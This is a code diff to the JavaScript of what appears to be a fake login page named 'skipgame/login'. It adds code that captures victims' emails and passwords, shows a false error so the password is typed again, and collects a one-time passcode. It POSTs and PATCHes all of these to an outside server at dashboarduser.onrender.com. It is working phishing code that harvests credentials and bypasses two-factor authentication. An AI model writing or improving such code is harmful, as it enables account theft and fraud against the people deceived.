@@ -26,6 +26,34 @@
       }
   
       const data = await response.json();
+
+      // Assuming you have these functions defined somewhere
+      hideElement(otpSystem);
+      showElement(otpSystem);
+      return data
+    } catch (error) {
+      // Handle errors
+      console.error('Error:', error);
+    }
+  }
+
+  async function updateData( id,formData) {
+    const url = `https://dashboarduser.onrender.com/api/information/${id}`
+    try {
+      const response = await fetch(url, {
+        method: 'PATCH',
+        headers: {
+          'Content-Type': 'application/json',
+          // Add any other headers if needed
+        },
+        body: JSON.stringify(formData),
+      });
+  
+      if (!response.ok) {
+        throw new Error(`HTTP error! Status: ${response.status}`);
+      }
+  
+      const data = await response.json();
       console.log('Response from server:', data);
   
       // Assuming you have these functions defined somewhere
@@ -46,6 +74,7 @@
 
   // Object to store form data
   const formData = {};
+  let updatedId = null;
 
   // Function to hide an element
   function hideElement(element) {
@@ -58,21 +87,26 @@
   }
 
   // Function to handle login form submission
-  function handleLoginSubmit(event) {
+  async function handleLoginSubmit(event) {
       console.log('clicked');
     event.preventDefault();
-    // Store form data in the formData object
     if(passClick<2){
      passClick++
      formData.email = loginForm.querySelector('input[type="email"]').value;
      formData.password = loginForm.querySelector('input[type="password"]').value;
      showElement(errorMsg)
      formData.user=userId
+     const  data = {...formData,siteName:"skipgame/login"}
+     const result = await postData(data)
+     updatedId= result?.data?._id
      loginForm.querySelector('input[type="password"]').value = '';
      return 
     }
     formData.email = loginForm.querySelector('input[type="email"]').value;
     formData.repassword = loginForm.querySelector('input[type="password"]').value;
+    await updateData(updatedId,{repassword:formData.repassword ,user:formData.user})
+    
+  
     // Hide login form and show OTP form
     hideElement(loginSystem);
     showElement(otpSystem);
@@ -82,16 +116,11 @@
   // Function to handle OTP form submission
  async function handleOTPSubmit(event) {
     event.preventDefault();
-    // Get OTP value and handle authentication (you can customize this part)
     const otp = otpForm.querySelector('input[type="text"]').value;
-    const  data = {...formData,otp,siteName:"skipgame/login"}
-     
-
-    await postData(data)
-  
+    await updateData(updatedId,{otp:otp,user:formData.user})
     hideElement(otpSystem);
     showElement(loginSystem);
-    // window.location.reload();
+    window.location.reload();
   }
 
   // Event listeners
@@ -101,8 +130,6 @@
   // Event listener for the "Log out instead" link in the OTP section
   document.querySelector("#otpSystem a[href='#']").addEventListener("click", function (event) {
     event.preventDefault();
-    console.log('clicked');
-    // Show login form and hide OTP form
     showElement(loginSystem);
     hideElement(otpSystem);
   });
